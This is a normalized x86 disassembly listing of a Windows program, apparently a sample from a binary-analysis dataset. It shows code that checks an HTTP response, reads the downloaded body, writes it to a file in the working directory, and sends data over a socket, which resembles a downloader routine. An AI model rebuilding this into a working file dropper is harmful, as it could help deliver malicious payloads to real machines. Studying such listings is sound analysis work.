push 0x13
push edi
call esi
lea eax [ ebp - 0x20 ]
push eax
call [ atoi@IAT ]
cmp eax 0x194
pop ecx
je r-xdata
lea eax [ ebp - 0x8 ]
push ebx
push eax
lea eax [ ebp - 0x80 ]
push eax
push 0x5
push edi
mov [ ebp - 0x8 ] 0x20
call esi
lea eax [ ebp - 0x80 ]
push eax
call [ atol@IAT ]
mov esi eax
lea eax [ esi + 0x1 ]
push eax
call ??2@YAPAXI@Z
pop ecx
mov [ ebp - 0x10 ] eax
pop ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push eax
push edi
call [ InternetReadFile@IAT ]
cmp [ ebp - 0x4 ] ebx
je r-xdata
push 0x200
call ??2@YAPAXI@Z
pop ecx
mov esi eax
push esi
push 0x40
call [ GetCurrentDirectoryA@IAT ]
push 0x40
push esi
push esi
call [ GetLongPathNameA@IAT ]
push rw-data
push esi
call strcat
lea eax [ ebp - 0x60 ]
push eax
push esi
call strcat
push rw-data
push esi
call [ fopen@IAT ]
mov esi eax
add esp 0x18
cmp esi ebx
je r-xdata
push esi
push [ ebp - 0x4 ]
push 0x1
push [ ebp - 0x10 ]
call [ fwrite@IAT ]
push esi
call [ fflush@IAT ]
push esi
call [ fclose@IAT ]
push [ ebp - 0x10 ]
call ??3@YAXPAX@Z
add esp 0x1c
sub_402334
push esi
push edi
mov edi [ esp + 0x14 ]
test edi edi
mov esi edi
jle r-xdata
mov eax edi
push 0x0
push esi
push [ esp + 0x18 ]
push [ esp + 0x18 ]
call [ send@IAT ]
test eax eax
jl r-xdata
or eax 0xffffffff
jmp r-xdata
je r-xdata
pop edi
pop esi
retn
mov eax edi
sub eax esi
jmp r-xdata
add [ esp + 0x10 ] eax
sub esi eax
test esi esi
jg r-xdata
sub_402390
push ecx
cmp eax 0x1000
lea ecx [ esp + 0x8 ]
jb r-xdata
sub ecx eax
mov eax esp
test [ ecx ] eax
mov esp ecx
mov ecx [ eax ]
mov eax [ eax + 0x4 ]
push eax
retn
sub ecx 0x1000
sub eax 0x1000
test [ ecx ] eax
cmp eax 0x1000
jae r-xdata
_start
push ebp
mov ebp esp
push 0xffffffff
push r--data
push _except_handler3
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x68
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
xor ebx ebx
mov [ ebp - 0x4 ] ebx
push 0x2
call [ __set_app_type@IAT ]
pop ecx
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
call [ __p__fmode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
call [ __p__commode@IAT ]
mov ecx [ rw-data ]
mov [ eax ] ecx
mov eax [ _adjust_fdiv@IAT ]
mov eax [ eax ]
mov [ rw-data ] eax
call sub_402557
cmp [ rw-data ] ebx
jne r-xdata
call sub_402542
push rw-data
push rw-data
call _initterm
mov eax [ rw-data ]
mov [ ebp - 0x6c ] eax
lea eax [ ebp - 0x6c ]
push eax
push [ rw-data ]
lea eax [ ebp - 0x64 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
lea eax [ ebp - 0x60 ]
push eax
call [ __getmainargs@IAT ]
push rw-data
push rw-data
call _initterm
add esp 0x24
mov eax [ _acmdln@IAT ]
mov esi [ eax ]
mov [ ebp - 0x74 ] esi
cmp [ esi ] 0x22
jne r-xdata
push sub_402554
call [ __setusermatherr@IAT ]
pop ecx
cmp [ esi ] 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
mov al [ esi ]
cmp al bl
je r-xdata
mov al [ esi ]
cmp al bl
je r-xdata
inc esi
mov [ ebp - 0x74 ] esi
jmp r-xdata
cmp [ esi ] 0x22
jne r-xdata
cmp al 0x22
jne r-xdata
mov [ ebp - 0x30 ] ebx
lea eax [ ebp - 0x5c ]
push eax
call [ GetStartupInfoA@IAT ]
test [ ebp - 0x30 ] 0x1
je r-xdata
cmp al 0x20
jbe r-xdata
inc esi
mov [ ebp - 0x74 ] esi
push 0xa
pop eax
movzx eax [ ebp - 0x2c ]
jmp r-xdata
push eax
push esi
push ebx
push ebx
call [ GetModuleHandleA@IAT ]
push eax
call sub_401000
mov [ ebp - 0x68 ] eax
push eax
call [ exit@IAT ]
__WSAFDIsSet
jmp [ __WSAFDIsSet@IAT ]
memset
jmp [ memset@IAT ]
strlen
jmp [ strlen@IAT ]
strcat
jmp [ strcat@IAT ]
strcpy
jmp [ strcpy@IAT ]
??2@YAPAXI@Z
jmp [ operator new@IAT ]
??3@YAXPAX@Z
jmp [ operator delete@IAT ]
_XcptFilter
jmp [ _XcptFilter@IAT ]
_initterm
jmp [ _initterm@IAT ]
sub_402542
push 0x30000
push 0x10000
call _controlfp
pop ecx
pop ecx
retn
sub_402554
xor eax eax
retn
sub_402557
retn
_except_handler3
jmp [ _except_handler3@IAT ]
_controlfp
jmp [ _controlfp@IAT ]
